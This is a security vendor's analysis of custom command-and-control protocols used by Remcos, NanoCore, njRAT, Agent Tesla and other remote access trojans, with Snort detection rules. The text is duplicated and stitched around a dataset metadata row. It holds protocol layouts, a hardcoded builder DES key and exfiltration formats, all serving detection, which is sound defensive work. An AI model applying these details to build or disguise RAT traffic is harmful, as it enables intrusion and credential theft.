NetWire RAT is downloaded as a second-stage payload to systems that have been compromised using other malware such as GuLoader. Also, it was found to be delivered via [exploit kits](/blogs/security-research/sundown-chronicles-observations-exploit-kits-evolution). NetWire communicates with custom protocols over TCP and communication is encrypted with AES encryption. Each packet begins with a length of data followed by one byte for the command and then followed by data. The initial packet sends a 32-byte seed value along with 16-byte IV value and hardcoded password specified in the binary to generate the AES key. The C&C server generates a session key for this information. ![](https://lh4.googleusercontent.com/usA4f2R1PIROH6JL8hvC6FHrb_GuwbBcM3LO2F6hudKGMeEyRfB3Waea5wyfE3nSlk6MyqzXj0SE6t05M4etgOhBwOGYJ_pa2Akv4hN8S34D4S3CRVALYkQwBGqdRCThxlk9ZHrk) *Fig.8: Data sent to C&C server as AES encrypted.* As the communication is AES encrypted, it is not possible to scan for signature patterns in communication. However, there is enough information in the initial packet to flag the traffic as NetWire C&C communication. ### **AsyncRAT** AsyncRAT is an open-source RAT designed to remotely monitor and control other computers through a secure encrypted connection. AsyncRAT provides functionality such as keylogger, screen viewer, command execution, and many more. Because of its feature of secure communication, AsyncRAT is used for malicious motives by cybercriminals and weaponized in APT campaigns such as ""[Operation Spalax](https://www.welivesecurity.com/2021/01/12/operation-spalax-targeted-malware-attacks-colombia/). AsyncRAT has been found to be delivered via various methods such as spear-phishing, malvertising, and exploit kits. AsyncRAT communicates over secure TCP channels. As the custom certificate is carried in the binary itself and matched against the C&C certificate, it is not possible to strip the TLS layer at the proxy/gateway level. However, such custom certificates can be filtered out and communication can be blocked by other preventing controls. ![](https://lh6.googleusercontent.com/BNgh3pB-hE3i75fI2LSr9VK7ePZZBZCsiph1M5US6SA0Bbpxa16uuoyrATQTg3bxHjUbU7Ioe65psbtZBq0_Wt9JzweADaAdhdmck0S9UAt6ildONREL6uTwxoyARwUHLznCo48P) *Fig.9: Server certificate having subject and issuer name as “AsyncRAT Server”* #### **Quasar RAT** Quasar is an open-source RAT that has been observed being used maliciously by cybercriminals and APT actors including “[Gorgon Group](https://attack.mitre.org/groups/G0078/)” and “[Patchwork](https://attack.mitre.org/groups/G0040/). Its features include remote desktop, keylogging, password stealing, and many more. Quasar encrypts communications using an AES algorithm with a pre-shared key hardcoded in the client binary. It is not possible to scan for signature patterns on AES-encrypted traffic. However, the distinctive characteristics of encrypted data packets can be leveraged to flag Quasar's AES encrypted traffic. ![](https://lh3.googleusercontent.com/McWJS_eN_K5qholLoB9qdc8ov8DeRV38MG1uGZ-_1F4rRmCrKiFUKo1rrV5YHo4yI1xUPFtw8z-h2sc7F-8C9_bIH8vW1FWxdKL2FVKRXBox2vL71qJsAnhSI4GDRslj74o8f3gI) *Fig.10: Data sent to C&C server as AES encrypted.* The distinctive first 4 bytes of the payload can be used to identify Quasar traffic. Specifically, the first 4 bytes can identify the first packet sent from the server to the client following the TCP handshake. This packet is used to initiate the server/client authentication process. The first 4 bytes of the TCP payload contain ""40 00 00 00"" which is the size of the data that follows in little endian. ### **Agent Tesla RAT** The Agent Tesla RAT has been very active and prevalent. Over the last couple of years, there have been huge ongoing phishing campaigns delivering Agent Tesla RAT. Agent Tesla has evolved over time, varying its behavior from campaign to campaign. Cybercriminals use this RAT to steal user credentials and spy on victims through screenshots, keyboard logging, and clipboard capturing. Credential stealing is supported across various software ranging from browsers to mail clients, VPNs, and wallets. Agent Tesla communicates and exfiltrates data to its C&C server on HTTP, FTP, SMTP, and Telegram API. All collected data is encapsulated into an HTML page, and that HTML page is sent to a C&C over one of the aforementioned protocols. For communication over FTP, the HTML page is sent as a file to an FTP C&C server. The file name is generated in format “PW\_<UserName>\_<OS>\_<Timestamp>.HTML” ![](https://lh5.googleusercontent.com/Y2YwbsGuKtRdA_tsmpFz6qgeMTmxXwe-zF7sgYpReVYihtEZu9w08FFi-yJ5qzMCnwYd4r6fzrGcDDUroOywVfewZonLRNFxZwPQphavAwcr0ADmVNNUqlNrHIi-rJPmfDqtapIU) *Fig.11: Data to be sent via FTP.* ![](https://lh3.googleusercontent.com/8F2MVgT3zx-6rcHGYEHNkJp9wj610xCU0yscksACAnADDhWCNdNZ7sBkzjHrsY1PLAGurtUGTjlBBf4TQTK-P4Jxq42mm0_1A0-LpwsP373wrC6lYZOS9sgarmgIl3Auq8CzRQy0) *Fig.12: Exfiltration over FTP* For communication over SMTP, the HTML page is sent as a mail body to the C&C server. The mail subject is generated in format “PW\_<UserName>/<ComputerName>”. ![](https://lh3.googleusercontent.com/KYoapIP64WbQl-mIxxYgRLvQSfgBJKwb9u8jg2zaJVJgaaSrRvsgJO3Hau49yWAr9H4VeOfc1l5f_viEFHZkKKUwEEyQc1WufV2JPf5vDBjadrOkgLSp1Wcj9hEJrTJ53a7sHfjA) *Fig.13: Exfiltration over SMTP* ### **CyberGate RAT** CyberGate allows an attacker to browse and manipulate files, devices, and settings on the victim's machine as well as download and execute additional malware. It also has a wide range of information-stealing abilities including browser credential theft, keylogging, screen capture, and remote enabling of webcams. The CyberGate RAT communicates on a custom protocol over TCP. CyberGate collects the info as per the command received from the C&C server, compresses data by ZLib, encrypts it by RC4 with a hardcoded key, and then sends it to the C&C server. ![](https://lh5.googleusercontent.com/w7yMadYDfy63uAqE1g1xU9jgXCwXmDTdXnlH9nKlKi6vHxwnMVdpW2yTY_Yc0RENUtNHigOp-bqQ9xcdhsLtcU3gza8f2Gl48_C--ecJSnlc4CIvPjpB1geOiwUYVHBwb8S1Vjmj) *Fig.14: Compressed and Encrypted data sent to C&C.* Packets begin with the data length followed by a marker then by a new line delimiter followed by encrypted data. To flag the CyberGate RAT traffic, a combination of data length, marker, and delimiter can be considered. ### **NanoCore RAT** Though NanoCore RAT emerged almost a decade ago, it is still one of the most prevalent RAT families, and multiple versions have appeared since then. NanoCore RAT is modular malware which comes with plugin support to expand its functionality. Basic plugins feature remote surveillance via remote desktop, monitor webcam, capture audio, etc. Additional plugins have been found to be used for cryptocurrency mining, ransomware attacks, credential stealing, and more. NanoCore RAT has been found to be delivered via phishing emails containing .doc macros that load a NanoCore binary with fileless infection techniques. NanoCore communicates on a custom protocol over TCP and uses the DES algorithm with hardcoded key and IV value to encrypt the communication between bot and its C&C server. The communication packet begins with a 4-byte data length followed by DES-encrypted data of that length. ![](https://lh3.googleusercontent.com/Kmhmv9brGs4R-gbEkuKh4W4GdCVsEFslRyxOrVNV9Rdgpc3wGLEf6QQhviCLHNkMet7yfp1Ft7YSbRSXC0v7_1LsEabrZQeWq2he2ZMpANYPyeCF7G6hLH7ZJqvVBNBM54GlQRXJ) Fig.15: Encrypted data C&C communication It is not possible to scan for patterns in DES-encrypted data. However, we observed that the publicly available bot builder does not have an option for configuring the DES key. Thus, all samples generated from this bot-builder will have the same DES key, which is “722018788C294897”. This results in some encrypted traffic that will be the same across all bots generated using the publicly available bot-builder. One such command from the server is “is alive” which is 0x600; when encrypted with a key it will produce “c1 c3 d0 32 43 59 a1 78”. However, there are other customized bot-builders available underground that allow the user to configure the key. For a more generic detection, we need to check for heuristics of data length value against TCP packet size and entropy of data. The first response from the server will be always 0x24 bytes in length, and the first 4 bytes will always be “20 00 00 00”. This response contains a GUID of plugins that the bot will load. The bot responds back to this with 0x12 bytes data, which will always start with the 4-byte stream “08 00 00 00”. These characteristics can be leveraged for detection. ![](https://lh4.googleusercontent.com/4Az6eIbXS8nGOa0nXeVKw8ahmi2f46MSMsDp0IkUkhyeNdlLIAlDODx-tlGFKh6z6WLf8H18JFnWJAj8mOsAYP2jfo1Hg65SSyPvAJ-ANHCOwMS05rZ5D2LLb-qDoDDvJvnn1Z-w) Fig.16: Fix length first response from C&C server. ### **Gh0st RAT** Gh0st is an open-source RAT that has been observed being used maliciously by cybercriminals and APT actors such as “[TA459](https://attack.mitre.org/groups/G0062/)” and “[APT18](https://attack.mitre.org/groups/G0026/)."". Its features include remote desktop, logging keystrokes, stealing credentials, capturing microphone and webcam, and many more. The source code of the Gh0stRAT is publicly available and attackers have customized it to suit their needs. Thus, many variants have been discovered. Gh0st communicates on a custom protocol over TCP. It uses a sequential byte-to-byte encryption algorithm to encrypt communication with the C&C server. Upon execution, it collects system data such as system information, version, processor description, installed antivirus, etc. Then, a marker and data length are prepended to this data. Finally, collected data is encrypted with single-byte operation of XOR and SUB on each byte. ![](https://lh4.googleusercontent.com/4LbGU33qsv7CmoSQurQlSHwWvXM7Ma3GRLeKAxXQbftHAIkXMF6EW5ucgwBdclY84Zq5-ZY0K1vwARPoCUS7fUUK4C1NTdnVBcF_2t6XwK56x9c4TwsdE5tQoKeteaX_lUESl0NS) *Fig.17: Collected data before encryption and after encryption.* ### **njRAT** Discovered almost a decade ago, njRAT, also known as Bladabindi, is the most active and prevalent remote access trojan. It allows attackers to do surveillance and control the victim's computer. Its features include remote desktop, logging keystrokes, stealing credentials, capturing microphone and webcam, and many more. njRAT is mostly found to be delivered via phishing email campaigns containing malicious Word document attachments. It is also found to be delivered by masquerading as a legitimate application installer uploaded to file-sharing services and luring victims via drive-by download campaigns. Since the leak of source code 2013, njRAT has become widely adopted by cybercriminals and APT actors including [Gorgon Group](https://attack.mitre.org/groups/G0078/) and [APT41](https://attack.mitre.org/groups/G0096/). Numerous variants have been detected over the years. Some variants have been found to be communicating over standard HTTP protocol and others were found to be communicating over custom protocols over TCP. The packet begins with data length in a decimal format null-terminated string followed by command and then delimiter followed by exfiltrated data. ![](https://lh6.googleusercontent.com/Q9ONmRNh0G3xnn2RPK3XQs9oRlGKpb8izMFU7exiDBuTNfSuCJxI6FWKlGsCgEN6s3lmozlZapJ3wjin-jZAYFSeQYvJBxvvBpeHe9flzbDgTdAqUeyWDCheWfPpwtyACyfM-rBR) *Fig.18: Fix length first response from C&C server.* ### **Coverage:** Zscaler’s multilayered cloud security platform detects indicators at various levels. The following are the Cloud IPS (non-HTTP/S) signatures that enable detection of the above RATs: [Win32.Backdoor.RemcosRAT](https://threatlibrary.zscaler.com/threats/4461cfa5-4155-499b-a1b5-e866cd05df97) [Win32.Backdoor.NetwiredRC](https://threatlibrary.zscaler.com/threats/8e9bd46b-2820-4f49-8b11-8712761e366d) [Win32.Backdoor.CrimsonRAT](https://threatlibrary.zscaler.com/threats/1d5c6832-d582-41cd-a050-e51251663138) [Win32.Backdoor.AsyncRAT](https://threatlibrary.zscaler.com/threats/2a3c4fd0-57d3-4816-8ffe-400f95ba6f37) [Win32.Backdoor.QuasarRAT](https://threatlibrary.zscaler.com/threats/3e8d15d9-287b-4ed2-ab16-fa58f7446a59) [Win32.Backdoor.AgentTesla](https://threatlibrary.zscaler.com/threats/35372622-693c-4166-8b6e-ccbf7f669cb5) [Win32.Backdoor.Cybergate](https://threatlibrary.zscaler.com/threats/6430f34a-aece-42ef-9435-c1bcc45a7f4b) [Win32.Backdoor.Nanocore](https://threatlibrary.zscaler.com/threats/51db83e0-80cf-4760-81a9-db4af507a5d8) [Win32.Backdoor.Gh0stRAT](https://threatlibrary.zscaler.com/threats/124cb8b3-bca5-420f-a4c5-71f4450d3ed3) [Win32.Backdoor.NjRat](https://threatlibrary.zscaler.com/threats/5056fbf2-0119-4348-9b26-59feccdd5bb7/) ### **Conclusion** All of the above-discussed RATs are communicating on custom and encrypted protocols over TCP. When communication is encrypted, it is more difficult to scan for their signature patterns in network traffic. However, we have discussed alternative ways to flag RAT traffic based on the heuristics of encrypted data. Four properties that are common to most RAT traffic on non-HTTP/S are: 1.Packets start with a length of encrypted data. Adding 4 to the little endian value of the first 4 should give the total length of TCP data. 2.Entropy of data followed after data length is high. 3.The C&C server responds in the same packet format as the client. 4.Often, server responses have lengths in specific ranges as they send only commands. Snort Rules ----------- *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.CrimsonRat - CNC command""; flow:established,to\_client; content:""|00 00 00 00|""; offset: 1; depth: 4; pcre:""/\x00\x00\x00\x00(thumb|filsz|rupth|dowf|endpo|scrsz|cscreen|dirs|stops|scren|cnls|udlt|delt|afile|listf|file|info|runf|fles|dowr|info|fldr)+=/""; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NetWiredRC - Check-in request""; flow:established,to\_server; dsize:69; content:""|41 00 00 00 99|""; offset:0; depth:5; flowbits:set,ZS.NetwireRAT.Client; flowbits:noalert; metadata: classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NetWiredRC - Check-in response""; flow:established,to\_server; dsize:5; content:""|3f 00 00 00 9b|""; flowbits:isset,ZS.NetwireRAT.Client; metadata: classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.AsyncRAT - Malicious SSL Cert""; flow:established,to\_client; content:""|16 03 01|""; offset:0; depth:3; content:""AsyncRAT""; distance:0; fast\_pattern; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.QuasarRAT - CNC response header""; flow:established,to\_client; dsize:68; content:""|40 00 00 00|""; offset: 0; depth: 4; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.AgentTesla CNC via FTP/SMTP""; flow:established,to\_server; content:""|3C|html|3E|Time|3A|""; content:""|3C|br|3E|User Name|3A|""; content:""|3C|br|3E|Computer Name|3A|""; distance: 0; content: ""|3C|br|3E|OSFullName|3A|""; distance: 0; content:""CPU|3A|""; distance: 0; content:""|3C|br|3E|RAM|3A|""; distance: 0; content: ""URL|3A|""; distance: 0; content: ""Application|3A|""; distance: 0; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> any any (msg:""Zscaler Win32.Backdoor.CyberGate - Data Exfiltration""; flow:established,to\_server; dsize:40<>300; pcre:""/\d{2,3}[#$]{4,6}\x0d\x0a/""; content:""|23 23 24 23 23 0d 0a|""; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore Pulse check""; flow:established,to\_server; dsize:12; content:""|08 00 00 00|""; offset: 0; depth: 4; content:""*/*c1 c3 d0 32 43 59 a1 78|""; distance:0; within:8; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore - Generic C&C command (request)""; flow:established,to\_server; flowbits:isset,ZS.NanocoreGen; dsize:12; content:""|08 00 00 00|""; offset:0; depth:4; byte\_test:1,!=,0,5,relative; reference:url,https://zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore - Generic C&C command (response)""; flow:established,to\_client; flowbits:noalert; flowbits:set,ZS.NanocoreGen; content:""|20 00 00 00|""; offset:0; depth:4; byte\_test:1,!=,0,5,relative; dsize:36; reference:url,https://zscaler.com;)* *alert tcp any any -> any any (msg:""Zscaler Win32.Backdoor.Gh0stRAT - Possible Data Exfil activity""; flow:to\_server,established; byte\_extract:1,10,varbyte; byte\_test:1,!=,varbyte,11; byte\_test:1,=,varbyte,12; byte\_test:1,=,varbyte,13; byte\_test:1,!=,varbyte,15; byte\_extract:4,16,vardword; byte\_test:4,=,vardword,20; byte\_test:4,=,vardword,24; byte\_test:4,=,vardword,28; byte\_test:4,!=,vardword,0; sid:8000031; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NjRat - Data Exfil activity""; flow:to\_server,established; content:""|00|inf""; offset:3; depth:4; pcre:""/\d{1,3}\x00\w{1,3}/""; pcre:""/(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/""; flowbits:isset,ZS.njrat; flowbits:unset,ZS.njrat; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NjRat - Data Exfil activity""; flow:to\_server,established; content:""|00|ll""; offset:3; depth:3; pcre:""/^\d{1,3}\x00/""; pcre:""/(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/""; flowbits:set,ZS.njrat; flowbits:noalert; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*"
annoctr,annoctr/AnnoCTR/text/train/zscaler_2021-05-05_catching-rats-over-custom-protocols.txt,zscaler_2021-05-05_catching-rats-over-custom-protocols,G0083,"Catching RATs Over Custom Protocols May 05, 2021 Adversaries generally use Standard Application Layer Protocols for communication between malware and command and control (C&C) servers. This is for several reasons: first, malicious traffic blends in more easily with legitimate traffic on standard protocols like HTTP/S; second, companies that rely on appliances for security often don’t inspect all SSL/TLS encrypted traffic as it is extremely resource-intensive to do so. However, the massive growth of SSL attacks – [260% higher in 2020 compared to 2019](/blogs/security-research/2020-state-encrypted-attacks) – has turned many security teams’ attention to these encrypted channels. For those that do inspect their encrypted traffic, modern network security proxies, gateways, and firewalls are evolved enough to conveniently parse application protocols and strip the SSL layer to scan the underlying data. And by knowing the protocol, scan engines using heuristics or machine-learning techniques can more easily differentiate between malicious and legitimate traffic, giving security teams an advantage. These trends have led some adversaries to turn to custom protocols. Although custom protocols for malicious communication are nothing new, almost one-third of prevalent malware families we recently analyzed support communication over non-HTTP/S protocols. Almost all of these malware families are Remote Access Trojans (RATs) and are found all over, from campaigns of mass infection to highly targeted attacks. In this article, we dissect the custom protocols used in some of the most prevalent RATs seen in recent campaigns. At the end, we share a number of signatures and Snort rules that aid in detecting these attacks. Below are statistical representations of traffic that Zscaler blocked for non-HTTP/S C&C communication, as well as the most active RAT families that we observed over a three-month period. ![](https://lh5.googleusercontent.com/aYzD50PDgdfzxXZyjeGnZ1rFbL-b7dYT3UQCAZqIIgf8MAI3Adj4MziWl0n-AuYx6tISUTHpur-YwI9J7Z2s7gKMRX_eLqMUMoDEdQ1NcJYgiHUZNj6taGB_E-S9p0XZ7MhBSPR1) *Fig.1: Hits of top threats communicating over non-HTTP/S in the last quarter.* *![](https://lh5.googleusercontent.com/PriwwYlpzpsb-E89vgyjWguBklqQvrw8j4DN9ttZ_LaIShbiWvvvyVjUw-MgUxV6X-JU_DTOWtl5VGU06GqCY83AsXDuBJee6_cx0egzqKtIVxD7TnkT1-z_frrKimsVbb7Z9ApG)* *Fig.2: Hits of top non-HTTP/S based RAT families in last quarter.* ### **Remcos RAT** Remcos is remote access and surveillance software developed and distributed by an organization called Breaking Security. The Remcos RAT appeared in hacking forums in late 2016. Since then, it has been favored by many cyber criminals and even adopted by APT actors such as the [Gorgon Group](https://attack.mitre.org/groups/G0078/) and [Elfin Group](https://attack.mitre.org/groups/G0064/). Remcos is primarily delivered to victims via malicious attachments in phishing emails. Its capabilities range from logging keystrokes to executing commands, stealing credentials, and capturing microphones and webcams. RC4 key and encrypted configuration data is kept in the resource section “SETTINGS” under “RCData”. The configuration contains the C&C address, port, mutex name, and encryption key for C&C communication. ![](https://lh6.googleusercontent.com/zN7waqVzJ7bcYrfOAkgqH-_czg5hvNth-DIU6ll956XT3r7e49_4CLHbjXWxlnc7D4fCrNd_UIXEW3hKz8K4Wt7lGVLzCuIsbBTcUhFu4JP0n4f4zFXterYWG-HxAva4QI_S5gIo) *Fig.3: Encrypted configuration in resource.* ![](https://lh5.googleusercontent.com/vd-LhD9lYGPqT3Yl_ABwdyq2A0yN5YasLtqsvF_hSua6QkxIMi9MZ0zgtZfpRDpSgUfZmxbCKOcB4G9mUh7VY5uSDjYzUwHl8wjZzk102ApFqJeabOokBoYv0Z3nSZ2b2pOTZZ3d) *Fig.4: Decrypted configuration* Remcos communicates over non-HTTP/S channels/ports on custom protocols. The bot can be configured to communicate in plain text, which makes it fairly straightforward to detect C&C traffic. The custom protocol contains the header “[DataStart]” followed by the size of data and then followed by the exfiltrated data. ![](https://lh5.googleusercontent.com/7wLs8lUEMdYFPShrSwZR0DS-dWkSEznyb1LzuiirRBrwkx_aOfRHBBA9IZi6M3wA_tZ8wmTxQ-nVQQRAXBqHX1bUn9QziriO_-34JLECbcWR-OTBtiG6WhFF2EQQxOYd8qQz_vnB) *Fig.5: Data sent to C&C server in plain text.* However, in most cases, the communication is encrypted using the RC4 algorithm with a key present in the configuration. It is not possible to match signatures in encrypted binary data. However, there is scope for heuristics-based detection. Upon execution, Remcos sends system information to its C&C server, and in return the server replies with commands to execute. As this request and response is encrypted with the same symmetric key, the header “[DataStart]” will generate the same encrypted stream of bytes in place of the header for all communication generated by the executable. ![](https://lh5.googleusercontent.com/ueaF5gjccOqVQVXS2sRGsLoQin-mq3xSkD-SwxC7XZRlQLqmidAWsItAJKXAALu_LIsYjNqovbDiRsM3DRRqSg6lvtdZ9s4SvOJuxehAqyQA6pj0uhLjIdNuwNvOZlUXBinfRIsI) *Fig.6: Data sent to C&C server as RC4 encrypted.* As an example, it can be seen in the above image, a binary stream of bytes “08 b4 de f6 84 27 70 9a 57 17 5e” has taken place of the header “[DataStart]”. The repeated stream pattern of 11 bytes in requests and responses—plus a combination of other heuristics such as entropy and data length limits—can be considered for flagging RC4 encrypted Remcos traffic. ### **Crimson RAT** Crimson RAT has been favored by threat actors for targeted attacks on governments and organizations in the financial, healthcare, and space technology sectors. In 2016, it was found to be used in targeted attacks against Indian diplomatic and military resources. Last year, we found it [targeting Indian financial institutions](/blogs/security-research/targeted-attack-indian-financial-institution-delivers-crimson-rat). Crimson is typically delivered to the victim via a phishing email containing a malicious .doc file or link to a malicious executable. ![](https://lh3.googleusercontent.com/c7KKJMQxQbwMWpqvZ_pJkOGJ6PmWkAp4tsVV3p2Bz3q0URqeSGgeSN9pxCx23208FoGOV4FeHCC6KDY3foKhvH9u1izFykL4QfoUi2Hxgs4rA_Wgtnzh6arhGnzXhGB3hG65-euh) *Fig.7: Data sent to C&C server* ### **NetWire RAT** The NetWire RAT is a malicious tool that emerged almost a decade ago and has been updated many times since then. NetWire has been detected in various campaigns such as [Hydrojiin](/blogs/security-research/look-hydrojiin-campaign) and advanced persistent threat (APT) attacks including [SilverTerrier](https://attack.mitre.org/groups/G0083/) and [The White Company](https://attack.mitre.org/groups/G0089/). Typically, the NetWire RAT is downloaded as a second-stage payload to systems that have been compromised using other malware such as GuLoader. Also, it was found to be delivered via [exploit kits](/blogs/security-research/sundown-chronicles-observations-exploit-kits-evolution). NetWire communicates with custom protocols over TCP and communication is encrypted with AES encryption. Each packet begins with a length of data followed by one byte for the command and then followed by data. The initial packet sends a 32-byte seed value along with 16-byte IV value and hardcoded password specified in the binary to generate the AES key. The C&C server generates a session key for this information. ![](https://lh4.googleusercontent.com/usA4f2R1PIROH6JL8hvC6FHrb_GuwbBcM3LO2F6hudKGMeEyRfB3Waea5wyfE3nSlk6MyqzXj0SE6t05M4etgOhBwOGYJ_pa2Akv4hN8S34D4S3CRVALYkQwBGqdRCThxlk9ZHrk) *Fig.8: Data sent to C&C server as AES encrypted.* As the communication is AES encrypted, it is not possible to scan for signature patterns in communication. However, there is enough information in the initial packet to flag the traffic as NetWire C&C communication. ### **AsyncRAT** AsyncRAT is an open-source RAT designed to remotely monitor and control other computers through a secure encrypted connection. AsyncRAT provides functionality such as keylogger, screen viewer, command execution, and many more. Because of its feature of secure communication, AsyncRAT is used for malicious motives by cybercriminals and weaponized in APT campaigns such as ""[Operation Spalax](https://www.welivesecurity.com/2021/01/12/operation-spalax-targeted-malware-attacks-colombia/). AsyncRAT has been found to be delivered via various methods such as spear-phishing, malvertising, and exploit kits. AsyncRAT communicates over secure TCP channels. As the custom certificate is carried in the binary itself and matched against the C&C certificate, it is not possible to strip the TLS layer at the proxy/gateway level. However, such custom certificates can be filtered out and communication can be blocked by other preventing controls. ![](https://lh6.googleusercontent.com/BNgh3pB-hE3i75fI2LSr9VK7ePZZBZCsiph1M5US6SA0Bbpxa16uuoyrATQTg3bxHjUbU7Ioe65psbtZBq0_Wt9JzweADaAdhdmck0S9UAt6ildONREL6uTwxoyARwUHLznCo48P) *Fig.9: Server certificate having subject and issuer name as “AsyncRAT Server”* #### **Quasar RAT** Quasar is an open-source RAT that has been observed being used maliciously by cybercriminals and APT actors including “[Gorgon Group](https://attack.mitre.org/groups/G0078/)” and “[Patchwork](https://attack.mitre.org/groups/G0040/). Its features include remote desktop, keylogging, password stealing, and many more. Quasar encrypts communications using an AES algorithm with a pre-shared key hardcoded in the client binary. It is not possible to scan for signature patterns on AES-encrypted traffic. However, the distinctive characteristics of encrypted data packets can be leveraged to flag Quasar's AES encrypted traffic. ![](https://lh3.googleusercontent.com/McWJS_eN_K5qholLoB9qdc8ov8DeRV38MG1uGZ-_1F4rRmCrKiFUKo1rrV5YHo4yI1xUPFtw8z-h2sc7F-8C9_bIH8vW1FWxdKL2FVKRXBox2vL71qJsAnhSI4GDRslj74o8f3gI) *Fig.10: Data sent to C&C server as AES encrypted.* The distinctive first 4 bytes of the payload can be used to identify Quasar traffic. Specifically, the first 4 bytes can identify the first packet sent from the server to the client following the TCP handshake. This packet is used to initiate the server/client authentication process. The first 4 bytes of the TCP payload contain ""40 00 00 00"" which is the size of the data that follows in little endian. ### **Agent Tesla RAT** The Agent Tesla RAT has been very active and prevalent. Over the last couple of years, there have been huge ongoing phishing campaigns delivering Agent Tesla RAT. Agent Tesla has evolved over time, varying its behavior from campaign to campaign. Cybercriminals use this RAT to steal user credentials and spy on victims through screenshots, keyboard logging, and clipboard capturing. Credential stealing is supported across various software ranging from browsers to mail clients, VPNs, and wallets. Agent Tesla communicates and exfiltrates data to its C&C server on HTTP, FTP, SMTP, and Telegram API. All collected data is encapsulated into an HTML page, and that HTML page is sent to a C&C over one of the aforementioned protocols. For communication over FTP, the HTML page is sent as a file to an FTP C&C server. The file name is generated in format “PW\_<UserName>\_<OS>\_<Timestamp>.HTML” ![](https://lh5.googleusercontent.com/Y2YwbsGuKtRdA_tsmpFz6qgeMTmxXwe-zF7sgYpReVYihtEZu9w08FFi-yJ5qzMCnwYd4r6fzrGcDDUroOywVfewZonLRNFxZwPQphavAwcr0ADmVNNUqlNrHIi-rJPmfDqtapIU) *Fig.11: Data to be sent via FTP.* ![](https://lh3.googleusercontent.com/8F2MVgT3zx-6rcHGYEHNkJp9wj610xCU0yscksACAnADDhWCNdNZ7sBkzjHrsY1PLAGurtUGTjlBBf4TQTK-P4Jxq42mm0_1A0-LpwsP373wrC6lYZOS9sgarmgIl3Auq8CzRQy0) *Fig.12: Exfiltration over FTP* For communication over SMTP, the HTML page is sent as a mail body to the C&C server. The mail subject is generated in format “PW\_<UserName>/<ComputerName>”. ![](https://lh3.googleusercontent.com/KYoapIP64WbQl-mIxxYgRLvQSfgBJKwb9u8jg2zaJVJgaaSrRvsgJO3Hau49yWAr9H4VeOfc1l5f_viEFHZkKKUwEEyQc1WufV2JPf5vDBjadrOkgLSp1Wcj9hEJrTJ53a7sHfjA) *Fig.13: Exfiltration over SMTP* ### **CyberGate RAT** CyberGate allows an attacker to browse and manipulate files, devices, and settings on the victim's machine as well as download and execute additional malware. It also has a wide range of information-stealing abilities including browser credential theft, keylogging, screen capture, and remote enabling of webcams. The CyberGate RAT communicates on a custom protocol over TCP. CyberGate collects the info as per the command received from the C&C server, compresses data by ZLib, encrypts it by RC4 with a hardcoded key, and then sends it to the C&C server. ![](https://lh5.googleusercontent.com/w7yMadYDfy63uAqE1g1xU9jgXCwXmDTdXnlH9nKlKi6vHxwnMVdpW2yTY_Yc0RENUtNHigOp-bqQ9xcdhsLtcU3gza8f2Gl48_C--ecJSnlc4CIvPjpB1geOiwUYVHBwb8S1Vjmj) *Fig.14: Compressed and Encrypted data sent to C&C.* Packets begin with the data length followed by a marker then by a new line delimiter followed by encrypted data. To flag the CyberGate RAT traffic, a combination of data length, marker, and delimiter can be considered. ### **NanoCore RAT** Though NanoCore RAT emerged almost a decade ago, it is still one of the most prevalent RAT families, and multiple versions have appeared since then. NanoCore RAT is modular malware which comes with plugin support to expand its functionality. Basic plugins feature remote surveillance via remote desktop, monitor webcam, capture audio, etc. Additional plugins have been found to be used for cryptocurrency mining, ransomware attacks, credential stealing, and more. NanoCore RAT has been found to be delivered via phishing emails containing .doc macros that load a NanoCore binary with fileless infection techniques. NanoCore communicates on a custom protocol over TCP and uses the DES algorithm with hardcoded key and IV value to encrypt the communication between bot and its C&C server. The communication packet begins with a 4-byte data length followed by DES-encrypted data of that length. ![](https://lh3.googleusercontent.com/Kmhmv9brGs4R-gbEkuKh4W4GdCVsEFslRyxOrVNV9Rdgpc3wGLEf6QQhviCLHNkMet7yfp1Ft7YSbRSXC0v7_1LsEabrZQeWq2he2ZMpANYPyeCF7G6hLH7ZJqvVBNBM54GlQRXJ) Fig.15: Encrypted data C&C communication It is not possible to scan for patterns in DES-encrypted data. However, we observed that the publicly available bot builder does not have an option for configuring the DES key. Thus, all samples generated from this bot-builder will have the same DES key, which is “722018788C294897”. This results in some encrypted traffic that will be the same across all bots generated using the publicly available bot-builder. One such command from the server is “is alive” which is 0x600; when encrypted with a key it will produce “c1 c3 d0 32 43 59 a1 78”. However, there are other customized bot-builders available underground that allow the user to configure the key. For a more generic detection, we need to check for heuristics of data length value against TCP packet size and entropy of data. The first response from the server will be always 0x24 bytes in length, and the first 4 bytes will always be “20 00 00 00”. This response contains a GUID of plugins that the bot will load. The bot responds back to this with 0x12 bytes data, which will always start with the 4-byte stream “08 00 00 00”. These characteristics can be leveraged for 